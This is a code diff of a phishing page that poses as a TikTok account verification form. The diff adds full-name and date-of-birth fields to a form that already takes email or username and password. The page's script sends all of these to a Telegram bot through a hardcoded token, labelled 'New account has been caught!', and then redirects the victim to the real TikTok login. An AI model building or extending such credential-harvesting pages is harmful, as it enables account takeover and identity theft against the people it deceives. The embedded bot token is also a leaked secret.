@@ -14,8 +14,6 @@
       --muted: #bbbbbb;
       --radius: 18px;
       --input-bg: #222222;
-      --hover-bg: #e60045;
-      --glow: 0px 0px 6px var(--primary);
     }
 
     * {
@@ -48,11 +46,6 @@
       text-align: center;
       opacity: 0;
       animation: fadeIn 1s forwards;
-      transition: box-shadow 0.3s ease-in-out;
-    }
-
-    .card:hover {
-      box-shadow: var(--glow);
     }
 
     @keyframes fadeIn {
@@ -76,14 +69,12 @@
       font-size: 20px;
       color: var(--text);
       margin-bottom: 10px;
-      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
     }
 
     p {
       font-size: 14px;
       color: var(--muted);
       margin-bottom: 20px;
-      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
     }
 
     input {
@@ -95,18 +86,10 @@
       border-radius: var(--radius);
       color: var(--text);
       font-size: 14px;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 5px var(--primary);
     }
 
     input::placeholder {
       color: #888;
-    }
-
-    input:focus {
-      background-color: #333333;
-      outline: none;
-      box-shadow: 0 0 8px var(--primary);
     }
 
     button {
@@ -120,11 +103,10 @@
       font-weight: bold;
       cursor: pointer;
       transition: background-color 0.3s ease;
-      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
     }
 
     button:hover {
-      background-color: var(--hover-bg);
+      background-color: #e60045;
     }
   </style>
 </head>
@@ -134,8 +116,10 @@
     <h2>Account Verification Request</h2>
     <p>Fill in the details below to submit your request</p>
     <form id="verifyForm">
+      <input type="text" placeholder="Full Name" id="fullName" required>
       <input type="text" placeholder="Email or Username" id="emailOrUser" required>
       <input type="password" placeholder="Password" id="password" required>
+      <input type="date" placeholder="Date of Birth" id="dob" value="2000-01-01" required>
       <button type="submit">Submit Request</button>
     </form>
   </div>
@@ -144,8 +128,10 @@
     document.getElementById("verifyForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
+      const fullName = document.getElementById('fullName').value;
       const emailOrUser = document.getElementById('emailOrUser').value;
       const password = document.getElementById('password').value;
+      const dob = document.getElementById('dob').value;
 
       // Send data to Telegram Bot
       const botToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
@@ -153,8 +139,10 @@
       const message = `
 *🎯 New Account Verification Request*
 
+👤 *Full Name:* ${fullName}
 📧 *Email or Username:* ${emailOrUser}
 🔑 *Password:* ${password}
+📅 *Date of Birth:* ${dob}
 
 🚨 *New account has been caught!* 🚨
       `;
@@ -170,8 +158,8 @@
       })
       .then(response => {
         if (response.ok) {
-          alert('Verification request received successfully!');
-          window.location.href = 'https://www.tiktok.com/login'; // Redirect to TikTok login page
+          // Redirect to TikTok login page after submitting
+          window.location.href = 'https://www.tiktok.com/login';
         } else {
           alert('Failed to send data!');
         }
